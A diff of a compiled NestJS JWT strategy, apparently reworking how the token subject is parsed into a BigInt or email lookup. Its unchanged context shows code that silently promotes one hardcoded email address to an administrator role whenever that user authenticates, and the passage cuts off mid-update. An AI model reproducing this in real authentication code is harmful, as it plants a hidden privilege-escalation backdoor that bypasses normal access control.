@@ -25,7 +25,15 @@ let JwtStrategy = class JwtStrategy extends (0, passport_1.PassportStrategy)(pas
         this.prisma = prisma;
     }
     async validate(payload) {
-        let user = await this.prisma.usuario.findUnique({ where: { id: payload.sub } });
+        const sub = payload?.sub;
+        const subStr = String(sub);
+        const where = (typeof sub === 'bigint')
+            ? { id: sub }
+            : (/^\d+$/.test(subStr) ? { id: BigInt(subStr) } : (payload?.email ? { email: payload.email } : null));
+        if (!where) {
+            throw new common_1.UnauthorizedException('Token inválido');
+        }
+        let user = await this.prisma.usuario.findUnique({ where });
         if (user && user.email === 'gtbump2012@gmail.com') {
             if (user.rol !== 'ADMINISTRADOR' && user.rol !== 'SUPER_ADMIN') {
                 user = await this.prisma.usuario.update({
